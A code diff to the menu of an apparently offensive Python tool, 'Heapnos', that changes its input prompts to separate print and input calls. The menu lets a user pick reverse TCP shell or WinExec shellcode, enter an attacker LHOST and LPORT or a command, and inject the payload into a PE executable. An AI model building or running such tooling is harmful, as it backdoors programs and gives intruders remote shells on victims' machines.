@@ -20,9 +20,12 @@ def menu():
 
     print(
         Color.GREEN + "Welcome to " + Color.RED +
-        "Heapnos Menu Version__" + Color.RESET
+        "Heapnos Standalone Version__" + Color.RESET
     )
-    value = input("Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ")
+    print(
+        "Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ", end=""
+    )
+    value = input()
     case = ["generate", "edit", "e", "g"]
     if value in case:
         if value == "generate" or value == "g":
@@ -73,18 +76,21 @@ def menu():
         LibDebug.Log("WORK", "Generating the shellcode..")
         try:
             if shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Shell":
-                LHOST = input("Please enter your " + Color.YELLOW +
-                              " LHOST IP " + Color.RESET + " : ")
-                LPORT = input("Please enter your " + Color.YELLOW +
-                              " LPORT " + Color.RESET + " : ")
+                print("Please enter your " + Color.YELLOW +
+                              " LHOST IP " + Color.RESET + " : ", end="")
+                LHOST = input()
+                print("Please enter your " + Color.YELLOW +
+                              " LPORT " + Color.RESET + " : ", end="")
+                LPORT = input()
                 shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
             elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Staged":
                 shellcode = LibShellcode.GenerateCDRTS()
             elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
                 shellcode = LibShellcode.GenerateCDRTTShell()
             elif shellcodes[int(value)] == "Custom_Dynamic_WinExec":
-                CMD = input("Please enter your " + Color.YELLOW +
-                            " COMMAND " + Color.RESET + " : ")
+                print("Please enter your " + Color.YELLOW +
+                            " COMMAND " + Color.RESET + " : ", end="")
+                CMD = input()
                 shellcode = LibShellcode.GenerateWinExec(CMD)
         except:
             LibDebug.Log(
@@ -109,8 +115,9 @@ def menu():
     LibDebug.Log("WORK", "Generating edited executable..")
     LibByteEditor.CreateExeFromPe(outputfile, PeInput)
 
-    value = input("Did you want to verify the new executable ? [ " + Color.YELLOW +
-                  "y" + Color.RESET + "/" + Color.YELLOW + "n" + Color.RESET + "] : ")
+    print("Did you want to verify the new executable ? [ " + Color.YELLOW +
+                  "y" + Color.RESET + "/" + Color.YELLOW + "n" + Color.RESET + "] : ", end="")
+    value = input()
     case = ["y", "n"]
     if value in case:
         try:
